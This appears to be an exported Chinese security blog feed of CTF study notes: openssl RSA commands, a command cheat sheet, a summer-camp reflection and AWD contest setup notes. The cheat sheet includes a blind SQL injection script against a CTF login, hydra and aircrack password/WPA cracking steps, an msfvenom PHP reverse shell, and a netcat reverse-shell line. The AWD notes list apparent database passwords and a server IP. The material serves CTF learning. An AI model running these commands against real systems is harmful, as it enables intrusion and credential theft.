<p>从这个包含公钥和私钥的文件中提取出公钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsa -in target.key -pubout -out target_pub.key</span><br></pre></td></tr></table></figure>

<p>从公钥中提取rsa公钥信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -in (filename) -text</span><br></pre></td></tr></table></figure>

<p>提取其中模数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -in (filename) -text -modulus</span><br></pre></td></tr></table></figure>

<h2 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h2><p>公钥加密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsautl -encrypt -in target -out target.enc -inkey target_pub.pem -pubin</span><br></pre></td></tr></table></figure>

<p>私钥解密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -in target.enc -out target -inkey target_pri.pem</span><br></pre></td></tr></table></figure>

<p>用三种填充方式解密,(第一种没有填充)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.dec</span><br><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.dec -oaep</span><br><span class="line">openssl rsautl -decrypt -in flag.enc-inkey private.key -out flag.dec -pkcs</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>零碎知识[working]</title>
    <url>/2019/08/28/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log flag.php #查看文件的历史版本</span><br><span class="line">git diff &#123;版本号&#125; #查看历史版本号的内容和现在内容的不同</span><br><span class="line">git reset --hard &#123;commit&#125;</span><br></pre></td></tr></table></figure>

<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find / -user downfall 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h3 id="mariadb-踩坑"><a href="#mariadb-踩坑" class="headerlink" title="mariadb 踩坑"></a>mariadb 踩坑</h3><p>运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -uroot</span><br><span class="line">use mysql;</span><br><span class="line">select * from user where user=&apos;root&apos;;</span><br></pre></td></tr></table></figure>

<p>就会发现root的plugin是unix_socket,关于这个插件的解释在这里</p>
<p><a href="https://mariadb.com/kb/en/library/authentication-plugin-unix-socket/" target="_blank" rel="noopener">https://mariadb.com/kb/en/library/authentication-plugin-unix-socket/</a></p>
<p>直观的效果是:当在终端中mysql -uroot -hlocalhost的时候可以登录,而且无需验证密码.但是php在以root身份连接数据库的时候只会遭到拒绝.</p>
<p>解决方法:创建一个新的用户,或者修改已有用户的登录机制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE USER &apos;newuser&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;password&apos;;</span><br><span class="line">ALTER USER newuser@localhost IDENTIFIED VIA mysql_native_password;</span><br><span class="line">GRANT ALL PRIVILEGES ON * . * TO &apos;newuser&apos;@&apos;localhost&apos;;</span><br></pre></td></tr></table></figure>

<h3 id="htaccess-实验"><a href="#htaccess-实验" class="headerlink" title=".htaccess 实验"></a>.htaccess 实验</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a2enmod</span><br><span class="line">vim /etc/apache2/site-enabled/000-default.conf</span><br><span class="line">	&lt;Directory /var/www/&gt;</span><br><span class="line">		Options -Indexes</span><br><span class="line">		AllowOverride All</span><br><span class="line">	&lt;/Directory&gt;</span><br><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure>

<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --local-port &#123;PORT&#125; &#123;url&#125; #从本地的指定端口去访问url</span><br><span class="line">curl -d "user=admin&amp;password=111" http://207.148.64.125:1111 #post数据</span><br><span class="line">curl -H "Content-Type:application/json" -X POST -d '&#123;"user": "admin", "passwd":"12345678"&#125;' http://127.0.0.1:8000/login</span><br></pre></td></tr></table></figure>

<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> this will create a container</span></span><br><span class="line">sudo docker run -it kalilinux/kali-linux-docker /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> after <span class="built_in">exit</span> it ,run container again</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> find out all the container</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -al will only show the active container</span></span><br><span class="line">sudo docker ps -a</span><br><span class="line">sudo docker container start &#123;container id&#125;</span><br><span class="line"></span><br><span class="line">docker ps</span><br><span class="line">sudo docker exec -it &#123;container id&#125; /bin/bash</span><br><span class="line"></span><br><span class="line">docker build -t ssrf-lab/basic . #构建镜像</span><br><span class="line">docker run -d -p 8999:80 ssrf-lab/basic #创建容器</span><br><span class="line">docker stop [容器编号] #关闭容器</span><br><span class="line"></span><br><span class="line">docker attach bianhao # 进入容器</span><br></pre></td></tr></table></figure>

<h3 id="python-执行js代码"><a href="#python-执行js代码" class="headerlink" title="python 执行js代码"></a>python 执行js代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line">jsFunc = <span class="string">'''</span></span><br><span class="line"><span class="string">function sign (data, key) &#123;</span></span><br><span class="line"><span class="string">    var privateKey</span></span><br><span class="line"><span class="string">    var i, j</span></span><br><span class="line"><span class="string">    var W = new Array(80)</span></span><br><span class="line"><span class="string">    var A, B, C, D, E</span></span><br><span class="line"><span class="string">    var H0 = 0x97B5D3F1</span></span><br><span class="line"><span class="string">    var H1 = 0x1F3D5B79</span></span><br><span class="line"><span class="string">    var H2 = 0x684A2C0E</span></span><br><span class="line"><span class="string">    var H3 = 0xE0C2A486</span></span><br><span class="line"><span class="string">    var H4 = 0x33221100</span></span><br><span class="line"><span class="string">    var H5 = 0xF0F0F0F0</span></span><br><span class="line"><span class="string">    var temp</span></span><br><span class="line"><span class="string">    var _RSA = function (n, s) &#123;</span></span><br><span class="line"><span class="string">        var t4 = (n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))</span></span><br><span class="line"><span class="string">        return t4</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    var _Rot = function (val) &#123;</span></span><br><span class="line"><span class="string">        var str = ''</span></span><br><span class="line"><span class="string">        var i</span></span><br><span class="line"><span class="string">        var v</span></span><br><span class="line"><span class="string">        for (i = 7; i &gt;= 0; i--) &#123;</span></span><br><span class="line"><span class="string">            v = (val &gt;&gt;&gt; (i * 4)) &amp; 0x0f</span></span><br><span class="line"><span class="string">            str += v.toString(16)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return str</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    str = unescape(encodeURIComponent(key + data))</span></span><br><span class="line"><span class="string">    var strLen = str.length</span></span><br><span class="line"><span class="string">    var wordArray = []</span></span><br><span class="line"><span class="string">    for (i = 0; i &lt; strLen - 3; i += 4) &#123;</span></span><br><span class="line"><span class="string">        j = str.charCodeAt(i) &lt;&lt; 24 |</span></span><br><span class="line"><span class="string">            str.charCodeAt(i + 1) &lt;&lt; 16 |</span></span><br><span class="line"><span class="string">            str.charCodeAt(i + 2) &lt;&lt; 8 |</span></span><br><span class="line"><span class="string">            str.charCodeAt(i + 3)</span></span><br><span class="line"><span class="string">        wordArray.push(j)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    switch (strLen % 4) &#123;</span></span><br><span class="line"><span class="string">        case 0:</span></span><br><span class="line"><span class="string">            i = 0x080000000</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        case 1:</span></span><br><span class="line"><span class="string">            i = str.charCodeAt(strLen - 1) &lt;&lt; 24 | 0x0800000</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        case 2:</span></span><br><span class="line"><span class="string">            i = str.charCodeAt(strLen - 2) &lt;&lt; 24 | str.charCodeAt(strLen - 1) &lt;&lt; 16 | 0x08000</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        case 3:</span></span><br><span class="line"><span class="string">            i = str.charCodeAt(strLen - 3) &lt;&lt; 24 |</span></span><br><span class="line"><span class="string">                str.charCodeAt(strLen - 2) &lt;&lt; 16 |</span></span><br><span class="line"><span class="string">                str.charCodeAt(strLen - 1) &lt;&lt;</span></span><br><span class="line"><span class="string">            8 | 0x80</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    wordArray.push(i)</span></span><br><span class="line"><span class="string">    while ((wordArray.length % 16) !== 14) &#123;</span></span><br><span class="line"><span class="string">        wordArray.push(0)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    wordArray.push(strLen &gt;&gt;&gt; 29)</span></span><br><span class="line"><span class="string">    wordArray.push((strLen &lt;&lt; 3) &amp; 0x0ffffffff)</span></span><br><span class="line"><span class="string">    H0 ^= H5</span></span><br><span class="line"><span class="string">    H1 ^= H5</span></span><br><span class="line"><span class="string">    H2 ^= H5</span></span><br><span class="line"><span class="string">    H3 ^= H5</span></span><br><span class="line"><span class="string">    H4 ^= H5</span></span><br><span class="line"><span class="string">    for (privateKey = 0; privateKey &lt; wordArray.length; privateKey += 16) &#123;</span></span><br><span class="line"><span class="string">        for (i = 0; i &lt; 16; i++) &#123;</span></span><br><span class="line"><span class="string">            W[i] = wordArray[privateKey + i]</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 16; i &lt;= 79; i++) &#123;</span></span><br><span class="line"><span class="string">            W[i] = _RSA(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        A = H0</span></span><br><span class="line"><span class="string">        B = H1</span></span><br><span class="line"><span class="string">        C = H2</span></span><br><span class="line"><span class="string">        D = H3</span></span><br><span class="line"><span class="string">        E = H4</span></span><br><span class="line"><span class="string">        for (i = 0; i &lt;= 19; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + ((B &amp; C) | (~B &amp; D)) + 0x5A820000 + E + W[i] + 0x00007999) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 20; i &lt;= 39; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0x6ED90000 + E + W[i] + 0x0000EBA1) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 40; i &lt;= 59; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + ((B &amp; C) | (B &amp; D) | (C &amp; D)) + 0x8F1B0000 + E + W[i] + 0x0000BCDC) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        for (i = 60; i &lt;= 79; i++) &#123;</span></span><br><span class="line"><span class="string">            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0xCA620000 + E + W[i] + 0x0000C1D6) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">            E = D</span></span><br><span class="line"><span class="string">            D = C</span></span><br><span class="line"><span class="string">            C = _RSA(B, 30)</span></span><br><span class="line"><span class="string">            B = A</span></span><br><span class="line"><span class="string">            A = temp</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        H0 = (H0 + A) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H1 = (H1 + B) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H2 = (H2 + C) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H3 = (H3 + D) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">        H4 = (H4 + E) &amp; 0x0ffffffff</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    temp = _Rot(H0) + _Rot(H1) + _Rot(H2) + _Rot(H3) + _Rot(H4)</span></span><br><span class="line"><span class="string">    return temp.toLowerCase()</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">jsContext = execjs.compile(jsFunc)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://95cfb6e44c614a3e97563689926ccf1d420c63a73b184eed.changame.ichunqiu.com/login.php"</span></span><br><span class="line">string=<span class="string">'!@#$%^&amp;*aM0123456789qwertyuiopsdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBN'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">39</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        username = <span class="string">"%s' or ascii(mid(`p@ssw0rd`,%d,1))=%d#"</span> % (<span class="string">''</span>,n,ord(i)) </span><br><span class="line">        password = <span class="string">"111"</span></span><br><span class="line"></span><br><span class="line">        _nonce = jsContext.call(<span class="string">"sign"</span>,username + password, <span class="string">"YTY"</span> + <span class="string">"0Yj"</span> + <span class="string">"M0Y"</span> + <span class="string">"2Rh"</span> + <span class="string">"ZTZ"</span> + <span class="string">"iMj"</span> + <span class="string">"liZ"</span> + <span class="string">"jFj"</span> + <span class="string">"OTQ"</span> + <span class="string">"xOD"</span> + <span class="string">"=="</span>)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'username'</span>:username,</span><br><span class="line">                <span class="string">'password'</span>:password,</span><br><span class="line">                <span class="string">'submit'</span>:<span class="string">''</span>,</span><br><span class="line">                <span class="string">'_nonce'</span>:_nonce</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Incorrect'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="vim比较两个文件的不同之处"><a href="#vim比较两个文件的不同之处" class="headerlink" title="vim比较两个文件的不同之处"></a>vim比较两个文件的不同之处</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vimdiff -o bootstrap.js fakebootstrap.js</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/40637063/59158832-170e2600-8af3-11e9-8238-9608a4f08714.png" alt="image"></p>
<h3 id="linux下php版本切换"><a href="#linux下php版本切换" class="headerlink" title="linux下php版本切换"></a>linux下php版本切换</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --set php /usr/bin/php7.0</span><br></pre></td></tr></table></figure>

<h3 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l downfall -P /usr/share/wordlists/rockyou.txt -t 4</span><br><span class="line">cewl -w dc2_passwords.txt http://dc-2</span><br></pre></td></tr></table></figure>

<h3 id="aircrack"><a href="#aircrack" class="headerlink" title="aircrack"></a>aircrack</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo airmon-ng start wlo1</span><br><span class="line">sudo airodump-ng wlo1mon</span><br><span class="line">sudo airodump-ng -w save_file -c 11 --bssid 02:1A:11:F1:A2:AB&#123;wifi_mac&#125; wlo1mon</span><br><span class="line"></span><br><span class="line">choose a active user</span><br><span class="line"></span><br><span class="line"> remain the terminal running above and start another.</span><br><span class="line"></span><br><span class="line">sudo aireplay-ng -0 100 -a 02:1A:11:F1:A2:AB&#123;wifi_mac&#125; -c &#123;client_mac&#125; wlo1mon</span><br><span class="line"></span><br><span class="line"> when there is WPA handshake show in the first terminal , continue.</span><br><span class="line">sudo aircrack-ng -w dict.txt -b &#123;wifi_mac&#125; save_file-01.cap</span><br></pre></td></tr></table></figure>

<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>php 文件上传payload生成：</p>
<p><code>sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=172.20.10.12 LPORT=9991 -f raw &gt; shell.php</code></p>
<p>然后上传shell.php之后。。。</p>
<p>监听并访问：</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58418041-39e31800-80b9-11e9-8cd8-efc433d76bfd.png" alt="image"></p>
<h3 id="创建python-虚拟环境"><a href="#创建python-虚拟环境" class="headerlink" title="创建python 虚拟环境"></a>创建python 虚拟环境</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m venv myvenv</span><br><span class="line">source venv/bin/activate</span><br></pre></td></tr></table></figure>

<h3 id="python-硬链接"><a href="#python-硬链接" class="headerlink" title="python 硬链接"></a>python 硬链接</h3><p>从一道凯撒加密题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cacer = <span class="string">'ZNK WAOIQ HXUCT LUD PASVY UBKX ZNK RGFE JUM UL IGKYGX GTJ EUAX ATOWAK YURAZOUT OY UVRJGNLYKTKY'</span></span><br><span class="line"></span><br><span class="line">cacer = list(cacer)</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">26</span>):</span><br><span class="line">    <span class="comment"># 原来写法是cacer_tmp = cacer,但是后来调试的时候发现cacer_tmp改变的时候cacer同时发生了变化,二者之间产生了硬链接</span></span><br><span class="line">    cacer_tmp = [i <span class="keyword">for</span> i <span class="keyword">in</span> cacer]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cacer_tmp)):</span><br><span class="line">        <span class="keyword">if</span> cacer_tmp[i] != <span class="string">' '</span>:</span><br><span class="line">            cacer_tmp[i] = chr((ord(cacer_tmp[i]) - <span class="number">65</span> + offset)%<span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span>.join(cacer_tmp).lower()</span><br></pre></td></tr></table></figure>

<h3 id="python调用命令行-getshell"><a href="#python调用命令行-getshell" class="headerlink" title="python调用命令行,getshell"></a>python调用命令行,getshell</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">md5 = os.popen(<span class="string">"python submd5.py "</span>+res_sub_md5+<span class="string">" 0"</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"/bin/nc (url) -p 4444 -e /bin/bash"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GuestCookie</span><span class="params">()</span>:</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    res = session.get(url)</span><br><span class="line">    <span class="keyword">return</span> session.cookies.get_dict()[<span class="string">'user'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#字符串转16进制</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">str=<span class="string">"content"</span></span><br><span class="line"><span class="keyword">print</span> binascii.b2a_hex(str.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#数字转10进制</span></span><br><span class="line"><span class="keyword">print</span> int(&#123;digest&#125;,&#123;shuzi_de_jinzhi&#125;)</span><br><span class="line"><span class="comment">#数字转16进制</span></span><br><span class="line"><span class="keyword">print</span> hex(&#123;digest&#125;,&#123;shuzi_de_jinzhi&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h3><p>when we talk about ‘hex’ ‘binary’ …or other things about encode , we are talking about ascii.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57535861-98985a00-7375-11e9-8485-9e86d74e2e0d.png" alt="Screenshot from 2019-05-10 22-46-34"></p>
<h3 id="python3-的编码问题"><a href="#python3-的编码问题" class="headerlink" title="python3  的编码问题"></a>python3  的编码问题</h3><p>因为做密码学课设的缘故, 全组成员统一使用python3来编写代码, 在编写过程中编码是个大问题, 因此在这里做一个备忘</p>
<p>python3中string类型和bytes类型已经明确分开来了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = &apos;1233&apos;</span><br><span class="line">a = u&apos;1233&apos;</span><br></pre></td></tr></table></figure>

<p>这两者是等效的, 都是string类型, 编码是unicode编码, bytes类型如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = b&apos;\x001233&apos;</span><br></pre></td></tr></table></figure>

<p>每一个bytes都是由八个比特位来表示他的ascii码.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    print(type(i))</span><br><span class="line">    <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>

<p>你会发现bytes类型的a中取出单个元素出来, 他的类型会变成int, 而且print的时候也会输出int, 但是如果是切片的话, 截取的结果却还是bytes.</p>
<p>接下来是转换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = b&apos;12334\x00&apos;</span><br><span class="line"># convert bytes to int</span><br><span class="line">b = int.from_bytes(a, byteorder=&apos;big&apos;)</span><br><span class="line"># convert int to bytes</span><br><span class="line">c = int.to_bytes(length=6, byteorder=&apos;big&apos;)</span><br><span class="line"># convert int to binarry string</span><br><span class="line">d = bin(b)[2:]</span><br><span class="line"># convert binarry string to int</span><br><span class="line">int(d, base=2)</span><br></pre></td></tr></table></figure>

<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adduser ch4ser</span><br><span class="line">adduser ch4ser sudo</span><br></pre></td></tr></table></figure>

<h2 id="关于docker和HyperV无法启动的问题"><a href="#关于docker和HyperV无法启动的问题" class="headerlink" title="关于docker和HyperV无法启动的问题"></a>关于docker和HyperV无法启动的问题</h2><ul>
<li><p>BIOS 中确定虚拟化功能全部打开</p>
</li>
<li><p>windows feature中启动HyperV</p>
</li>
<li><p>如果失败尝试以下命令:</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dism.exe /Online /Enable-Feature:Microsoft-Hyper-V /All</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果这个也不行的话</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype auto</span><br><span class="line">然后重启</span><br></pre></td></tr></table></figure>
</li>
<li><p>以上命令都要用管理员权限运行</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>xman2019</title>
    <url>/2019/08/21/xman2019%E5%BF%83%E5%BE%97%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>20多天的夏令营生活,见识了很多, 也对自己的实力有了一个较为清晰的定位(菜的一匹). 几次和rois的大佬交流, 深觉开发能力之重要, 进而又觉自己效率过低, 需要警戒啊.很多时候, 出一道题比做一道题让人收获更多.</p>
<p>不过学习一个开发框架, 也不一定非得从头到尾照着官方文档打一遍, 仅仅只是从头到尾过一遍, 快速摸清骨架, 查找相关的安全问题, 也不失为是一个锻炼快速学习能力的好机会.</p>
<p>复现方面, 自己也不能像以前一样一定要把每一道题目都要从头到尾搭建环境然后在每一个解题细节上纠结半天. 效率实在是太差, 也该会提纲挈领了.</p>
<p>从xman入营以来, 我一直都在忙着复现xctf的赛事, 但是从头复现, 实在是繁琐. 根本跟不上进度, 更不要说我还想回过头去复习以前的题目呢.这个时候就觉得知识点总结性的备忘录实在是重要, 每次做完题目之后, 取其精华, 纳入其中, 回过头去只需要两眼三眼就可以复习,反观自己之前的”错题本”, 其中的冗余之多, 我都想删了他.</p>
<p>工具方面, 很遗憾,但是不后悔的, 从linux主系统换回了windows, 回想之前为什么会折腾系统, 大概是自己没有把精力全部放在做题和提高自己吧,想到这里,更觉得惭愧.以后除非刚需, 否则再也不会去折腾一些配置了.</p>
<p>另外, 在这次夏令营, 不论哪位讲师, 都在强调快速学习的能力. 我感觉之前一年的努力方向出了差错, 只是在低效地扩宽自己的知识面但是不注重提高自己快速学习的能力.</p>
]]></content>
  </entry>
  <entry>
    <title>Awd笔记[working]</title>
    <url>/2019/08/19/Awd%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>密钥连接: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa(这是私钥) username@url</span><br></pre></td></tr></table></figure>

<p>刚进去是home目录,不是/var/www/html !!!</p>
<h2 id="开局操作"><a href="#开局操作" class="headerlink" title="开局操作"></a>开局操作</h2><p>修改ssh用户密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">登录之后使用passwd &#123;用户名&#125;</span><br></pre></td></tr></table></figure>

<p>数据库开局操作</p>
<p>h3ll0db4pp</p>
<p>dbapp_15final</p>
<p>root</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库备份</span><br><span class="line">mysqldump -u [username] –p[password] [database_name] &gt; [dump_file.sql]</span><br><span class="line">数据库本地恢复</span><br><span class="line">mysql -u [username] –p[password] [database_name] &lt; [dump_file.sql]</span><br><span class="line">数据库远程恢复</span><br><span class="line"> mysql –h [hostname] –u [username] –p[password] [database_name] &lt; [dump_file.sql]</span><br><span class="line">修改数据库用户密码</span><br><span class="line">set password for [username]@localhost=password(&apos;xxxxx&apos;);</span><br></pre></td></tr></table></figure>

<p>备份网站源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">打包压缩</span><br><span class="line">tar -czf source.tar.gz souce_code_folder</span><br><span class="line">在当前目录下解压网站源代码</span><br><span class="line">tar -xzf source.tar.gz</span><br></pre></td></tr></table></figure>

<p>使用scp或者rsync来传输文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r root@207.148.64.125:/home/ch4ser/blog/hexo/ ./</span><br><span class="line">scp root@207.148.64.125:/home/ch4ser/blog/hexo/_config.yml ./</span><br><span class="line">scp filename root@207.148.64.125:</span><br><span class="line">scp filename root@207.148.64.125:Document/</span><br><span class="line">scp -r folder root@207.148.64.125:Document/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> the method below is more functional</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">'a'</span> means digui-translation, <span class="string">'v'</span> means output the information generated during the transformation. <span class="string">'z'</span> means compare the transforming files with the <span class="built_in">local</span> file so that no duplicate and useless effort will be <span class="keyword">done</span>.</span></span><br><span class="line">rsync -avz root@207.148.64.125:/home/ch4ser/blog/hexo/ ./</span><br><span class="line">rsync -avz folder root@207.148.64.125:/Document</span><br></pre></td></tr></table></figure>

<h2 id="自动备份网站文件和数据库-sh"><a href="#自动备份网站文件和数据库-sh" class="headerlink" title="自动备份网站文件和数据库.sh"></a>自动备份网站文件和数据库.sh</h2><p>todo</p>
<h2 id="树莓派linux测试环境搭建"><a href="#树莓派linux测试环境搭建" class="headerlink" title="树莓派linux测试环境搭建"></a>树莓派linux测试环境搭建</h2><p>todo</p>
<h2 id="流量监控和关键字过滤waf-php"><a href="#流量监控和关键字过滤waf-php" class="headerlink" title="流量监控和关键字过滤waf.php"></a>流量监控和关键字过滤waf.php</h2><p>Done</p>
<h2 id="源文件定时同步"><a href="#源文件定时同步" class="headerlink" title="源文件定时同步"></a>源文件定时同步</h2><p>todo</p>
<h2 id="回显flag自动替换"><a href="#回显flag自动替换" class="headerlink" title="回显flag自动替换"></a>回显flag自动替换</h2><p>Done</p>
<h2 id="垃圾流量生成"><a href="#垃圾流量生成" class="headerlink" title="垃圾流量生成"></a>垃圾流量生成</h2><p>todo</p>
